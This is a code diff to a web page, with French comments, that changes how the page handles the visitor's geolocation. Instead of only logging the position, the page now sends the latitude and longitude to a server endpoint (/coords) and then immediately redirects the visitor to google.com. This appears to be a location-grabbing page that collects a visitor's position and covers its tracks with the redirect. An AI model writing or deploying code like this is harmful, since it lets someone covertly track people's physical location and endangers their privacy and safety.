@@ -16,9 +16,33 @@
             console.log("La géolocalisation n'est pas supportée par ce navigateur.");
         }
 
+        async function addCoordinates(latitude, longitude) {
+              try {
+                const response = await fetch("http://localhost:3000/coords", {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json",
+                  },
+                  body: JSON.stringify({ latitude, longitude }),
+                });
+            
+                if (!response.ok) {
+                  throw new Error(`Erreur serveur : ${response.status}`);
+                }
+            
+                const result = await response.json();
+                console.log("✅ Coordonnées ajoutées :", result);
+              } catch (error) {
+                console.error("❌ Erreur lors de l’ajout des coordonnées :", error);
+              }
+            }
+
+
         function showPosition(position) {
-            console.log(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
-            //window.location.href = "https://www.google.com/"
+            
+            addCoordinates(position.coords.latitude, position.coords.longitude);
+            //console.log(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
+            window.location.href = "https://www.google.com/"
         }
 
         function showError(error) {
